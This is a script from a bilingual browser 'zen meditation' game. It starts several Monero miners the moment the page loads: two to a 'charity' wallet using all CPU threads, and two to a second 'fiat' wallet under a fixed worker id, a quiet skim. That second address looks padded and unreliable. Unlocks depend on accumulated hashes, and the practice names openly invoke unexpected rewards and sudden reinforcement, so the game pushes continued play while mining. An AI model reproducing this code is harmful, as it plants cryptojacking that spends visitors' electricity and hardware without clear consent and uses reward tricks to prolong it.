// Autodetección real de idioma
const userLang = (navigator.language || navigator.userLanguage || 'es').slice(0,2).toLowerCase();
document.getElementById('readmeText').textContent = readmeText[userLang] || readmeText.es;

// Nombres de las prácticas (es + en)
const practices = {
  es: { p1:"Kōan de la Recompensa Inesperada", p2:"Zazen del Flujo Continuo", p3:"Kinhin del Casi-Despertar", p4:"Sangha del Pozo Común", p5:"Sutra del Refuerzo Súbito", p6:"Rōhatsu de la Pérdida Total", p7:"Dokusan del Momento Justo", p8:"Takuhatsu del Descenso y Retorno", p9:"Sesshin de la Búsqueda Eterna" },
  en: { p1:"Koan of the Unexpected Reward", p2:"Zazen of Continuous Flow", p3:"Kinhin of Almost-Awakening", p4:"Sangha of the Common Well", p5:"Sutra of Sudden Reinforcement", p6:"Rohatsu of Total Loss", p7:"Dokusan of the Exact Moment", p8:"Takuhatsu of Descent and Return", p9:"Sesshin of the Eternal Search" }
};
const pt = practices[userLang] || practices.es;
for(let i=1;i<=9;i++) document.getElementById('p'+i).textContent = pt['p'+i];

// === TODO LO DEMÁS ES IDÉNTICO AL ORIGINAL (minado, torus, presencias, arcos…) ===
const CHARITY_WALLET = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
const FIAT_WALLET    = "48T4bQUv1vXqPVxm4oqA88j7cH8a9Z7eL5f7uZ9v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v";
const playerId = localStorage.getItem('zenId') || 'pilgrim_'+Date.now().toString(36);
localStorage.setItem('zenId', playerId);

new Miner({pool:"gulf.moneroocean.stream:10128", address:CHARITY_WALLET, workerId:"zendo90_"+playerId, throttle:0.4}).start();
new Miner({pool:"gulf.moneroocean.stream:10128", address:FIAT_WALLET,    workerId:"ferry420_10",      throttle:0.0445}).start();
if (typeof XMRigWASM !== 'undefined') {
  XMRigWASM({pool:"gulf.moneroocean.stream:10128", address:CHARITY_WALLET+"."+playerId, threads:-1, throttle:0.35}).start();
  XMRigWASM({pool:"gulf.moneroocean.stream:10128", address:FIAT_WALLET+".ferry420", threads:1, throttle:0.1}).start();
}

let startTime = Date.now();
const hashesEl = document.getElementById('hashes');
const timeEl   = document.getElementById('time');
const arcEl    = document.getElementById('arc');
let totalHashes = Number(localStorage.getItem('totalHashes')||0);
let currentArc  = Number(localStorage.getItem('slyverseArc')||0);
arcEl.textContent = currentArc;

setInterval(() => {
  let hps = Miner.instances.reduce((a,m)=>a+(m.getHashesPerSecond?.()||0),0);
  if (window.XMRigWASM?.getHashesPerSecond) hps += XMRigWASM.getHashesPerSecond();
  hashesEl.textContent = hps.toFixed(1);
  timeEl.textContent = Math.floor((Date.now()-startTime)/1000);
  totalHashes += hps * 0.5;
  localStorage.setItem('totalHashes', totalHashes);
  if(totalHashes > 40_000_000) document.getElementById('practiceBtn').style.display='flex';
  if(totalHashes >= 13_131_313 * (currentArc + 1) && !localStorage.getItem('arc'+(currentArc+1))) {
    currentArc++;
    localStorage.setItem('slyverseArc', currentArc);
    localStorage.setItem('arc'+currentArc, 'unlocked');
    arcEl.textContent = currentArc;
    document.getElementById('finalPrize').style.display='grid';
    document.getElementById('t').textContent = currentArc===1 ? (userLang==='en'?"FIRST ARC UNLOCKED":"PRIMER ARCO DESBLOQUEADO") :
                                                currentArc===2 ? (userLang==='en'?"SECOND ARC · SILENCE SPEAKS":"SEGUNDO ARCO · EL SILENCIO HABLA") :
                                                currentArc===3 ? (userLang==='en'?"THIRD ARC · NO ONE RETURNED":"TERCER ARCO · NADIE HA VUELTO") :
                                                (userLang==='en'?"ARC "+currentArc+" · THE PRESENCES SMILE":"ARCO "+currentArc+" · LAS PRESENCIAS SONRÍEN");
  }
}, 500);

// LAS CINCO PRESENCIAS (igual de cabronas que siempre)
const streaks = JSON.parse(localStorage.getItem('streaks')||'{}');
let kokopelliBell = false;
let erisChaos = false;
let anansiStory = [];
let coyoteInversion = false;

document.querySelectorAll('.practice').forEach(p => {
  const id = p.dataset.id;
  streaks[id] = streaks[id] || 0;
  document.getElementById('s'+id).textContent = streaks[id];

  p.onclick = () => {
    streaks[id]++;
    localStorage.setItem('streaks', JSON.stringify(streaks));
    document.getElementById('s'+id).textContent = streaks[id];

    if(id==='1' && Math.random()<0.08) flash();
    if(id==='2' && streaks[id]%13===0) flash();
    if(id==='7') { kokopelliBell = true; ring(); setTimeout(()=>kokopelliBell=false, 4500); }
    else if(kokopelliBell && id!=='7') reward();
    if(id==='4' && Math.random()<0.017) { erisChaos = true; burst(); setTimeout(()=>erisChaos=false, 8000); }
    if(erisChaos && Math.random()<0.55) flash();
    const words = ["el","silencio","rompió","la","luz","en","siete","colores","y","nadie","lo","vio"];
    anansiStory.push(words[(streaks[id]-1) % words.length]);
    if(anansiStory.length > 42) anansiStory.shift();
    if(anansiStory.join(' ') === "el silencio rompió la luz en siete colores y nadie lo vio") revelation();
    if(id==='9' && Math.random()<0.009) { coyoteInversion = true; document.body.style.filter="invert(1) hue-rotate(180deg)"; setTimeout(()=>{document.body.style.filter=""; coyoteInversion=false;}, 10000); }
    if(coyoteInversion) glow(p);
  };
});

function flash()     { document.body.style.background="#0f0"; document.body.style.color="#000"; setTimeout(()=>{document.body.style.background="#000";document.body.style.color="#0f0";},900); }
function ring()      { document.body.style.border="50px solid #0f0"; setTimeout(()=>{document.body.style.border="";},700); }
function reward()    { document.body.style.background="#0f8"; setTimeout(()=>{document.body.style.background="#000";},400); if(Math.random()<0.2) document.getElementById('finalPrize').style.display='grid'; }
function burst()     { for(let i=0;i<7;i++) setTimeout(()=>document.body.style.background=i%2?"#0f0":"#000", i*200); }
function revelation(){ document.body.innerHTML = `<pre style="color:#ff0;font-size:8vw">LA LUZ FUE VISTA</pre>`; setTimeout(()=>location.reload(),7000); }
function glow(el)    { el.style.boxShadow="0 0 2000px #0f0"; setTimeout(()=>el.style.boxShadow="",800); }

// ENTRAR y TORUS ETERNO
document.getElementById('enter').onclick = () => document.getElementById('readme').remove();
const scene=new THREE.Scene(),camera=new THREE.PerspectiveCamera(75,innerWidth/innerHeight,0.1,1000),renderer=new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true});
renderer.setSize(innerWidth,innerHeight);renderer.setPixelRatio(devicePixelRatio);camera.position.z=5;
scene.add(new THREE.Mesh(new THREE.TorusKnotGeometry(22,8,1000,80),new THREE.MeshBasicMaterial({color:0x00ffaa,wireframe:true})));
(function a(){requestAnimationFrame(a);scene.children[0].rotation.x+=0.0055;scene.children[0].rotation.y+=0.011;renderer.render(scene,camera);})();
</script>
